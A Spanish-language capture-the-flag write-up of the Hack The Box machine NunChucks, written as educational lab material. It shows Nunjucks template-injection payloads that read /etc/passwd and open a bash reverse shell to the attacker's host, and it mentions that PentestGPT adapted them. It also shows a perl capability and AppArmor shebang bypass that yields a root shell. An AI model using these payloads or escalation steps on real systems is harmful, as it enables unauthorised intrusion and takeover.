---
title: NunChucks
description: Máquina NunChucks de Hackthebox
date: 2024-07-01 13:37:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Hackthebox
  - Linux
tags:
  - AppArmor
  - SSTI (Server Side Template Injection)
  - NodeJS
  - Nunjucks
image:
  path: /assets/img/NunChucks/NunChucks.png
---

## Skills

- AppArmor Profile Bypass (Privilege Escalation)
- NodeJS SSTI (Server Side Template Injection)
  
## Certificaciones

- eJPT
- eWPT
  
## Descripción

`NunChucks` es una máquina `easy linux` donde estaremos vulnerando la máquina a través de una `server side template injection` encontrada en su página web, obtendremos `acceso` a la `máquina víctima` explotando el `ssti`. Escalaremos privilegios aprovechando un `bug` de `AppArmor`

---

## Reconocimiento

Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad

```
# ping 10.129.95.252
PING 10.129.95.252 (10.129.95.252) 56(84) bytes of data.
64 bytes from 10.129.95.252: icmp_seq=1 ttl=63 time=58.7 ms
^C
--- 10.129.95.252 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 58.658/58.658/58.658/0.000 ms
```

### Nmap

Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de nmap

```
# sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -v 10.129.95.252 -oG openPorts
[sudo] password for justice-reaper: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 13:10 CEST
Initiating SYN Stealth Scan at 13:10
Scanning 10.129.95.252 [65535 ports]
Discovered open port 80/tcp on 10.129.95.252
Discovered open port 443/tcp on 10.129.95.252
Discovered open port 22/tcp on 10.129.95.252
Completed SYN Stealth Scan at 13:10, 13.68s elapsed (65535 total ports)
Nmap scan report for 10.129.95.252
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Se procede a realizar un análisis de `detección` de `servicios` y la `identificación` de `versiones` utilizando los puertos abiertos encontrados

```
# nmap -sCV -p22,80,443 10.129.95.252 -oN services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-03 13:14 CEST
Nmap scan report for 10.129.95.252
Host is up (0.084s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds
```

### Web Enumeration

Nos dirigimos a la página web y se visualiza lo siguiente:

![](/assets/img/NunChucks/image_1.png)

La web posee `virtual hosting` por lo tanto debemos añadir el dominio `nunchucks.htb` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.95.252   nunchucks.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Al acceder a la web vemos lo siguiente

![](/assets/img/NunChucks/image_2.png)

Podemos registrarnos en `https://nunchucks.htb/signup`

![](/assets/img/NunChucks/image_3.png)

Al intentar registrarnos no nos deja

![](/assets/img/NunChucks/image_4.png)

Para ver como se tramita la `petición`, abrimos el `burpsuite` y no damos cuenta que se está enviando un `json` a la dirección de la `api`

![](/assets/img/NunChucks/image_5.png)

Esto también se puede hacer desde el navegador, desde la pestaña network

![](/assets/img/NunChucks/image_6.png)

Podemos iniciar sesión en `https://nunchucks.htb/login`

![](/assets/img/NunChucks/image_7.png)

Al probar iniciar sesión nos dice que está actualmente `deshabilitado`

![](/assets/img/NunChucks/image_8.png)

Al iniciar intentar iniciar sesión vemos otro `endpoint` de la `api`

![](/assets/img/NunChucks/image_9.png)

Hemos `fuzzeado` el dominio `nunchucks.htb` en busca de nuevas `rutas` y no hemos encontrado nada interesante, por lo tanto como estamos ante un `virtual hosting`, he `fuzzeado` en busca de `subdominios` y he encontrado el subdominio `store.nunchucks.htb`

```
# wfuzz -c -t200 --hh 30587 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.nunchucks.htb' https://nunchucks.htb 
 /home/justice-reaper/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.18) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://nunchucks.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000081:   200        101 L    259 W      4028 Ch     "store"    
```

Añadimos `store.nunchucks.htb` al `/etc/hosts`

```
127.0.0.1       localhost
127.0.1.1       Kali-Linux
10.129.95.252   store.nunchucks.htb nunchucks.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

Cuando accedemos a `store.nunchucks.htb` vemos lo siguiente

![](/assets/img/NunChucks/image_10.png)

Al introducir un `correo` en y darle a `notify me`, nos aparece lo siguiente

![](/assets/img/NunChucks/image_11.png)

Al verse reflejado nuestro `input` en una parte de la `web` y vemos que por detrás está corriendo express y `node.js`, podríamos probar a ver si existe un `ssti`

![](/assets/img/NunChucks/image_12.png)

Efectivamente nos encontramos antes un ssti

![](/assets/img/NunChucks/image_13.png)

## Intrusión

Al estar corriendo `node.js`, he buscado en `hacktricks` y he dado con el template al que nos podríamos estar enfrentando, este template se llama `nunjucks` [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#nunjucks). Vamos a `capturar` la `petición` mediante `burpsuite` para poder explotar mejor esta vulnerabilidad

![](/assets/img/NunChucks/image_14.png)

He probado los `payloads` de la página de `hacktricks` sin embargo, `no funcionan` correctamente debido a que le estamos mandando el `payload` en un `json` y las `comillas` dan `conflictos`, por lo tanto he usado `PentestGPT` para obtener un payload `alternativo` para poder leer el `/etc/passwd`

{% raw %}
```
{{ range.constructor('return global.process.mainModule.require(\"fs\").readFileSync(\"/etc/passwd\", \"utf8\")')() }}
```
{% endraw %}

![](/assets/img/NunChucks/image_15.png)

Ahora vamos a establecernos unas `reverse shell` a nuestro equipo, le he pedido a `PentestGPT` que me `adapte` el `payload` para establecerme una `reverse shell` que se encuentra en la página de `hacktricks`

{% raw %}
```
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.16.15/4444 0>&1\\\"')\")()}}
```
{% endraw %}

![](/assets/img/NunChucks/image_16.png)

Una vez en la máquina víctima vamos a realizar un `tratamiento` a la `TTY`

```
# nc -nlvp 4444                                 
listening on [any] 4444 ...
connect to [10.10.16.15] from (UNKNOWN) [10.129.95.252] 36954
bash: cannot set terminal process group (1027): Inappropriate ioctl for device
bash: no job control in this shell
david@nunchucks:/var/www/store.nunchucks$ 
```

Obtenemos las `dimensiones` de nuestra `pantalla` 

```
# stty size
45 183
```

Efectuamos el `tratamiento` a la `TTY`

```
# script /dev/null -c bash
[ENTER]
[CTRL + Z]
# stty raw -echo; fg
[ENTER]
# reset xterm
[ENTER]
# export TERM=xterm
[ENTER]
# export SHELL=bash
[ENTER]
# stty rows 45 columns 183
[ENTER]
```

Ya tenemos un `consola` completamente `interactiva`

```
david@nunchucks:/var/www/store.nunchucks$ whoami
david
```

## Privilege Escalation

Al listar `capabilities` nos damos cuenta que con `perl` podríamos `escalar privilegios`

```
david@nunchucks:/tmp/scripts$ getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Debido a que `perl` tiene esa capabilities podemos ejecutar comandos como usuario `root`, sin embargo, parece que algunos `binarios` no los podemos `ejecutar`

```
david@nunchucks:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "whoami";'
root
```

Esto se parece bastante a `SELinux`, no encontramos nada en el sistema que diga que está instalado. Buscando `alternativas` a `SELinux` he encontrado `AppArmor`, si buscamos en el sistema nos daremos cuenta de que se encuentra `instalado`

```
find / -type f -name '*apparmor*' 2>/dev/null
/usr/lib/apparmor/rc.apparmor.functions
/usr/lib/apparmor/apparmor.systemd
/usr/lib/systemd/system/apparmor.service
/usr/lib/python3/dist-packages/apparmor-2.13.3.egg-info
/usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/apparmor.cpython-38.pyc
/usr/lib/python3/dist-packages/sos/report/plugins/apparmor.py
/usr/lib/x86_64-linux-gnu/libapparmor.so.1.6.1
/usr/sbin/apparmor_parser
/usr/share/man/man5/apparmor.d.5.gz
/usr/share/man/man5/apparmor.vim.5.gz
/usr/share/man/man7/apparmor.7.gz
/usr/share/man/man8/apparmor_parser.8.gz
/usr/share/man/man8/apparmor_status.8.gz
/usr/share/vim/addons/syntax/apparmor.vim
/usr/share/vim/registry/vim-apparmor.yaml
/usr/share/apport/package-hooks/source_apparmor.py
/usr/share/lintian/overrides/apparmor-notify
/usr/share/lintian/overrides/apparmor
/usr/share/lintian/overrides/python3-apparmor
/usr/share/lintian/overrides/libapparmor-perl
/usr/share/lintian/overrides/apparmor-easyprof
/usr/share/lintian/overrides/python3-libapparmor
/usr/share/lintian/overrides/libapparmor1
/usr/share/lintian/overrides/apparmor-utils
/usr/src/linux-headers-5.4.0-81-generic/include/config/security/apparmor.h
/usr/src/linux-headers-5.4.0-81-generic/include/config/default/security/apparmor.h
```

Nos metemos en el directorio donde los están perfiles de `AppArmor` y visualizamos el `perfil` de `perl`

```
david@nunchucks:/etc$ cd /etc/apparmor.d
david@nunchucks:/etc/apparmor.d$ ls
abstractions  force-complain  lsb_release      sbin.dhclient  usr.bin.man   usr.sbin.ippusbxd  usr.sbin.rsyslogd
disable       local           nvidia_modprobe  tunables       usr.bin.perl  usr.sbin.mysqld    usr.sbin.tcpdump
david@nunchucks:/etc/apparmor.d$ cat usr.bin.perl
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```

En `Hacktricks` encontramos un artículo sobre como `bypassear` la seguridad de `AppArmor` mediante el `shebang` [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor#apparmor-shebang-bypass)

```
david@nunchucks:/tmp$ echo '#!/usr/bin/perl
> use POSIX qw(strftime);
> use POSIX qw(setuid);
> POSIX::setuid(0);
> exec "/bin/sh"' > /tmp/test.pl
david@nunchucks:/tmp$ chmod +x /tmp/test.pl
david@nunchucks:/tmp$ /tmp/test.pl
# whoami
root
```

En `/opt` nos encontramos dos archivos interesantes, el archivo `backup.pl` también se aprovecha de este bug para `ejecutarse` como usuario `root`

```
# ls
backup.pl  web_backups
# cat backup.pl
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```
